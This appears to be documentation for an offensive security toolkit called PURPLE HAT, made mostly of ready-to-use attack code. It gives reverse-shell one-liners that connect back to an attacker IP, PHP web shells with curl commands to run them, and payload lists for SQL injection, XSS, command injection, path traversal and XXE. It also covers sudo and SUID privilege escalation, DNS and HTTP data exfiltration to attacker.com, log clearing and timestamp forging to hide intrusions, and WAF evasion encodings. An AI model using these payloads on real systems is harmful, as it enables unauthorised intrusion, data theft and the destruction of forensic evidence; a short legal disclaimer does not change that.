# 🔧 Advanced Tools & Exploits - Complete Documentation

## Overview

PURPLE HAT v2.0 includes a comprehensive suite of advanced security testing tools designed for professional penetration testers and security researchers.

---

## 🎯 Tool Categories

### 1️⃣ Reverse Shell Generator

Generate reverse shell payloads for establishing command-line access to target systems.

#### Supported Platforms
- **Bash** - Unix/Linux systems
- **Python** - Cross-platform (requires Python)
- **Netcat** - Network connectivity (if available)
- **PowerShell** - Windows systems (PowerShell 2.0+)
- **Perl** - Unix/Linux/Windows
- **PHP** - Web server environments
- **Ruby** - Ruby-enabled systems
- **JSP** - Java application servers

#### Usage Example

```javascript
// Generate Bash reverse shell to 192.168.1.100:4444
fetch('/api/tools/reverse-shell?ip=192.168.1.100&port=4444&type=bash')
    .then(r => r.json())
    .then(data => console.log(data.payload));
```

#### Example Payloads

**Bash:**
```bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```

**Python:**
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**PowerShell:**
```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.100",4444);
$stream = $client.GetStream();
# ... (interactive shell communication)
```

#### Listener Setup

```bash
# Netcat listener
nc -nlvp 4444

# Socat listener (more features)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Multi-handler (Metasploit)
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit"
```

---

### 2️⃣ Web Shell Generator

Create web shell files for file upload exploitation.

#### Supported Technologies
- **PHP** (Simple & Advanced variants)
- **ASP.NET** (.aspx files)
- **JSP** (Java Server Pages)

#### Web Shell Features

**Simple PHP Shell:**
```php
<?php system($_GET['cmd']); ?>
```
- Minimal code, small file size
- Easy to detect
- Maximum 255 character command limitation

**Advanced PHP Shell:**
```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```
- HTML output formatting
- Clean interface
- Better for interactive shells

#### Deployment Methods

```bash
# Using generated shell from web UI
# 1. Download the shell file
# 2. Upload to vulnerable application (file upload form)
# 3. Access shell at: http://target.com/uploads/shell.php?cmd=whoami

# Example command execution
curl "http://target.com/uploads/shell.php?cmd=id"
curl "http://target.com/uploads/shell.php?cmd=cat%20/etc/passwd"
curl "http://target.com/uploads/shell.php?cmd=whoami"
```

#### Post-Exploitation Commands

```bash
# Information gathering
whoami                    # Current user
id                       # User ID, groups
uname -a                 # System information
cat /etc/passwd          # User list
ps aux                   # Running processes
netstat -tlnp            # Network connections

# Privilege escalation enumeration
sudo -l                  # Check sudo permissions
find / -perm -4000      # SUID binaries
```

---

### 3️⃣ Exploit Payloads

Pre-built payload library for common vulnerabilities.

#### SQL Injection Payloads

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--
' UNION SELECT version(),user(),database(),4--
```

**Usage in Testing:**
```
Target: http://target.com/product.php?id=1
Injection Point: id parameter
Test: http://target.com/product.php?id=1 UNION SELECT NULL,NULL,NULL--
```

#### XSS (Cross-Site Scripting) Payloads

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src=javascript:alert('XSS')></iframe>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
```

**Testing:**
```
Reflected XSS: http://target.com/search?q=<script>alert('XSS')</script>
Stored XSS: Comment forms, profile fields, etc.
DOM XSS: JavaScript parameter manipulation
```

#### Command Injection Payloads

```bash
; ls -la
| id
& whoami
`id`
$(whoami)
&& cat /etc/passwd
|| cat /etc/shadow
```

#### Path Traversal Payloads

```
../../../etc/passwd
..\\..\\..\\windows\\win.ini
....//....//....//etc/passwd
..;/etc/passwd
%2e%2e%2fetc%2fpasswd
```

#### XXE (XML External Entity) Payloads

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

---

### 4️⃣ Privilege Escalation

Techniques and payloads for escalating user privileges.

#### Linux Escalation Techniques

**1. Sudo Abuse**
```bash
# Check sudo permissions
sudo -l

# Exploit if user can run dangerous commands
sudo -u#-1 /bin/bash    # Escalate to root
sudo env /bin/bash      # Escape from restricted environments
```

**2. SUID Binaries**
```bash
# Find SUID binaries
find / -perm -4000 -ls 2>/dev/null

# Exploit known vulnerable SUID binaries
# Examples: cp, cat, chmod with relative paths
```

**3. Linux Capabilities**
```bash
# List capabilities
getcap -r / 2>/dev/null

# Exploit if binary has dangerous capabilities
# Example: bash with cap_setuid can escalate to root
```

#### Windows Escalation Techniques

**1. UAC Bypass**
```powershell
powershell Start-Process cmd.exe -Verb runAs
runas /user:Administrator cmd.exe
```

**2. Privilege Enumeration**
```powershell
whoami /priv
net user Administrator
```

---

### 5️⃣ Payload Encoder

Encode payloads to bypass security filters (WAF, IDS, etc.)

#### Encoding Methods

| Method | Use Case | Example |
|--------|----------|---------|
| **URL Encode** | Query parameters | `%27%20OR%20%271%27%3D%271` |
| **Double URL Encode** | Bypass double-decode | `%252e%252e%252fetc` |
| **Base64** | Data obfuscation | `c2VsZWN0ICogZnJvbSB1c2Vycw==` |
| **Hex Encode** | Binary protocols | `0x73656c656374202a` |
| **Unicode** | Unicode normalization bypass | `\u0073\u0065\u006c` |
| **HTML Entity** | HTML context | `&lt;script&gt;` |
| **Mixed Case** | Case-sensitive filters | `SeLeCt * FrOm UsErS` |

#### Example Workflow

```javascript
// Original payload
const payload = "' OR '1'='1";

// URL encode
fetch('/api/tools/payload-encoder?payload=' + encodeURIComponent(payload) + '&encoding=url')
    .then(r => r.json())
    .then(data => console.log(data.encoded));
    // Output: %27%20OR%20%271%27%3D%271

// Base64 encode
fetch('/api/tools/payload-encoder?payload=' + encodeURIComponent(payload) + '&encoding=base64')
    .then(r => r.json())
    .then(data => console.log(data.encoded));
    // Output: JyBPUiAnMSc9JzE=
```

---

### 6️⃣ Data Exfiltration

Generate queries for covert data extraction.

#### DNS Tunneling

```javascript
// Exfiltrate password via DNS
fetch('/api/tools/data-exfiltration?data=password123&type=dns&domain=attacker.com')
    .then(r => r.json())
    .then(data => console.log(data.queries));
    // Output: ["cGFzc3dvcmQxMjM=.attacker.com", ...]
```

**Listener:**
```bash
# tcpdump capture
tcpdump -i eth0 'udp port 53' -A | grep attacker.com

# DNS exfil tool
dnsexfil -d attacker.com -r results.txt
```

#### HTTP Exfiltration

```javascript
// Exfiltrate data via HTTP requests
fetch('/api/tools/data-exfiltration?data=confidential&type=http&server=attacker.com:8080')
    .then(r => r.json())
    .then(data => console.log(data.requests));
    // Output: ["GET /Y29uZmlkZW50aWFsIQ==..", ...]
```

**Receiver:**
```bash
# Simple HTTP listener
nc -nlvp 8080

# Python HTTP server with logging
python3 -m http.server 8080
```

---

### 7️⃣ Advanced Features

#### Anti-Forensics Techniques

**Log Clearing (Linux):**
```bash
# Clear auth logs
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog

# Clear shell history
history -c
rm -rf ~/.bash_history
unset HISTFILE
```

**Log Clearing (Windows):**
```powershell
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
Clear-EventLog -LogName System
```

**Timestamp Manipulation:**
```bash
# Linux
touch -d "2020-01-01" /path/to/file

# Windows PowerShell
(Get-Item "C:\file").LastWriteTime = "01/01/2020 00:00:00"
```

#### WAF Bypass Techniques

```sql
-- Case variation
SeLeCt * FrOm users WHERE id = 1

-- Comment injection
SE/**/LECT * FROM users

-- Whitespace variation
SELECT%09* FROM%20users

-- Encoding combination
%53%45%4C%45%43%54 * FROM users
```

---

## 🔐 Security & Legal Considerations

### ⚠️ IMPORTANT LEGAL NOTICE

These tools are provided for **authorized security testing and educational purposes only**. 

**Unauthorized access to computer systems is ILLEGAL** and may result in:
- Criminal prosecution
- Civil liability
- Imprisonment
- Substantial fines

### Usage Guidelines

✅ **DO:**
- Obtain written authorization before testing
- Test only systems you own or have explicit permission to test
- Document all testing activities
- Maintain confidentiality of findings
- Follow responsible disclosure practices

❌ **DON'T:**
- Test without authorization
- Access systems without permission
- Exceed the scope of authorization
- Disrupt system operations
- Delete or modify data without permission

---

## 🛠️ API Reference

### Reverse Shell API

```
GET /api/tools/reverse-shell?ip=<ip>&port=<port>&type=<type>

Parameters:
  - ip (required): Attacker IP address
  - port (required): Attacker listening port (1-65535)
  - type (required): bash, python, nc, powershell, perl, php, ruby, jsp

Response:
{
  "type": "bash",
  "payload": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
  "description": "Bash reverse shell to 192.168.1.100:4444",
  "difficulty": "Medium"
}
```

### Web Shell API

```
GET /api/tools/webshell?type=<type>

Parameters:
  - type: php_simple, php_advanced, aspx, jsp

Response:
{
  "type": "php_simple",
  "code": "<?php system($_GET['cmd']); ?>",
  "description": "Simple PHP shell",
  "extension": ".php",
  "method": "File Upload",
  "difficulty": "Hard"
}
```

### Payload Encoder API

```
GET /api/tools/payload-encoder?payload=<payload>&encoding=<encoding>

Parameters:
  - payload (required): Payload to encode
  - encoding: url, double_url, base64, hex, unicode, html, mixed_case

Response:
{
  "original": "' OR '1'='1",
  "encoded": "%27%20OR%20%271%27%3D%271",
  "encoding": "url"
}
```

### Exploit Payloads API

```
GET /api/tools/exploit-payloads?type=<type>

Parameters:
  - type: sql, xss, cmd, traversal, xxe, ldap

Response:
{
  "type": "sql",
  "count": 5,
  "payloads": ["' UNION SELECT NULL--", ...]
}
```

### Privilege Escalation API

```
GET /api/tools/privilege-escalation?os=<os>&method=<method>

Parameters:
  - os (required): linux, windows
  - method: sudo, suid, capabilities, uac_bypass, privilege_check

Response:
{
  "os": "linux",
  "method": "sudo",
  "payloads": ["sudo -l", "sudo -u#-1 /bin/bash"],
  "risk_level": "Critical"
}
```

---

## 📚 Resources

### Learning Materials
- [OWASP Top 10](https://owasp.org/Top10/)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [PentesterLab](https://pentesterlab.com/)

### Tools & Frameworks
- **Burp Suite** - Web application testing
- **Metasploit** - Exploitation framework
- **Nmap** - Network scanning
- **Wireshark** - Network analysis

### Legal & Ethical
- [EC-Council Code of Ethics](https://www.eccouncil.org/about-us/core-values-and-ethics/)
- [SANS Code of Ethics](https://www.sans.org/security-awareness/)

---

## 🐛 Troubleshooting

### Common Issues

**Q: Reverse shell not connecting?**
- Verify firewall rules allow incoming connections on specified port
- Check if listener is running: `netstat -tlnp | grep :4444`
- Verify correct IP address (not 127.0.0.1 for remote targets)

**Q: Web shell 403 Forbidden?**
- Check file permissions: `chmod 644 shell.php`
- Verify PHP execution is enabled
- Check directory is writable

**Q: Payload blocked by WAF?**
- Try different encoding method
- Check WAF documentation for bypass techniques
- Use evasion techniques (case variation, comments, etc.)

---

## 📞 Support

For issues, questions, or suggestions:
- GitHub Issues: [PURPLE HAT Issues](https://github.com/PowerProgrammer05/Purple-Hat/issues)
- Documentation: [Full Docs](https://github.com/PowerProgrammer05/Purple-Hat)

---

**Last Updated:** January 2025  
**Version:** 2.0.0  
**License:** MIT
